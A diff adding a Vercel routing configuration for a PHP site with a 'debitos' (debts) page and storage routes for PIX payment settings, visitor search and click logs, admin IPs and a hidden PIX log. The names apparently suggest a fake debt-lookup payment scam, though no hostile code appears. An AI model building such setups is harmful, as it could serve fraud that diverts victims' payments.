@@ -1,0 +1,65 @@
+{
+  "$schema": "https://openapi.vercel.sh/vercel.json",
+  "headers": [
+    {
+      "source": "/",
+      "headers": [
+        {
+          "key": "Content-Type",
+          "value": "text/html; charset=utf-8"
+        }
+      ]
+    },
+    {
+      "source": "/index.php",
+      "headers": [
+        {
+          "key": "Content-Type",
+          "value": "text/html; charset=utf-8"
+        }
+      ]
+    },
+    {
+      "source": "/debitos.php",
+      "headers": [
+        {
+          "key": "Content-Type",
+          "value": "text/html; charset=utf-8"
+        }
+      ]
+    }
+  ],
+  "functions": {
+    "api/router.php": {
+      "runtime": "vercel-php@0.9.0",
+      "memory": 1024,
+      "maxDuration": 60
+    }
+  },
+  "routes": [
+    {
+      "src": "/",
+      "dest": "/index.html"
+    },
+    {
+      "src": "/(admin_ips|click_stats|consultados_log|pix_config|pix_config_admin|pix_last|pix_log|pix_log_oculto|search_log|stats)\\.json",
+      "dest": "/api/router.php?__storage=$1.json"
+    },
+    {
+      "src": "/pix_mode\\.txt",
+      "dest": "/api/router.php?__storage=pix_mode.txt"
+    },
+    {
+      "src": "/index\\.php",
+      "dest": "/index.html"
+    },
+    {
+      "src": "/debitos\\.php",
+      "dest": "/debitos.html"
+    },
+    {
+      "src": "/([^/]+\\.php)",
+      "dest": "/api/router.php?__file=$1"
+    }
+  ]
+}
